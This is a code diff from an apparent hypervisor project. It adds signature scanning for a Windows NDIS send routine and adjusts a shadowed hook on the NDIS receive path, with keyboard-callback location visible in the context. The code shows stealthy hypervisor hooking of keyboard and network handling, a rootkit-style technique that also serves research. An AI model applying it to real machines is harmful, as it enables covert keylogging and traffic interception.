@@ -127,6 +127,17 @@ __attribute__((section(".vmm"))) uint64_t locate_KeyboardClassServiceCallback(ui
     return KeyboardClassServiceCallback;
 }
 
+__attribute__((section(".vmm"))) uint64_t locate_ndisMSendNBLToMiniportInternal(uint64_t ndis){
+    byte_t sign[] = {
+        0x40, 0xb7, 0x02,                           // mov dil, 2
+        0x4c, 0x8b, 0xa1, 0xb8, 0x00, 0x00, 0x00    // mov r12, qword ptr [rcx+0B8h]
+    };
+
+    uint64_t ndisMSendNBLToMiniportInternal = find_signature(ndis, sign, 10) - 0x4e;
+
+    return ndisMSendNBLToMiniportInternal;
+}
+
 __attribute__((section(".vmm"))) void handle_lstar_write(uint64_t lstar){
 
     shared_cores_data.ntoskrnl = locate_ntoskrnl(lstar);
@@ -156,10 +167,12 @@ __attribute__((section(".vmm"))) void handle_MiDriverLoadSucceeded_hook(vmexit_d
     if (shared_cores_data.ndis == 0){
         shared_cores_data.ndis = find_windows_module(u"ndis.sys", 16);
         if (shared_cores_data.ndis != 0){
-            hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET),
+            LOG_INFO("Found ndis.sys: %x\n", shared_cores_data.ndis);
+
+            shared_cores_data.functions.ndisMSendNBLToMiniportInternal = locate_ndisMSendNBLToMiniportInternal(shared_cores_data.ndis);
+            hook_function(guest_virtual_to_physical(shared_cores_data.functions.NdisMIndicateReceiveNetBufferLists),
              &shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_x,
               shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_rw);
-            LOG_INFO("Found ndis.sys: %x\n", shared_cores_data.ndis);
         }
     }
 
